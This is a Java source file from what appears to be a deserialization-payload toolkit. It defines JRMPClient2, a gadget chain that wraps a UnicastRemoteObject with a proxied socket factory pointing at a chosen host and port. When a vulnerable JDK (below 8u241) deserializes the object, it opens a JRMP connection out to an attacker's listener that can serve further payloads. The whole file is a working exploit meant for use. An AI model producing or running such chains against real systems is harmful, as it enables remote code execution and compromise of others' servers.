package com.ppp.chain.jrmp;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

/**
 * @author Whoopsunix
 */
@Authors({Authors.h0ng10})
@Dependencies("JDK:<8u241")
@Sink({Sink.JNDI})
@EnchantType({EnchantType.JRMP})
public class JRMPClient2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(JRMPClient2.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.JRMP);
        sinksHelper.setHost("127.0.0.1");
        sinksHelper.setPort(1099);
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(JRMPClient2.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        SinkScheduler.builder(sinksHelper);
        String host = sinksHelper.getHost();
        Integer port = sinksHelper.getPort();

        Object kickOffObject = getChain(host, port);

        return kickOffObject;
    }

    public Object getChain(String host, int port) throws Exception {
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry

        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));

        RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);

        RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
                RMIServerSocketFactory.class.getClassLoader(),
                new Class[]{RMIServerSocketFactory.class, java.rmi.Remote.class},
                myInvocationHandler);

        UnicastRemoteObject myRemoteObject = (UnicastRemoteObject) Reflections.newInstance(UnicastRemoteObject.class, new Class[]{}, new Object[]{});
        Reflections.setFieldValue(myRemoteObject, "ssf", handcraftedSSF);

        return myRemoteObject;
    }
}
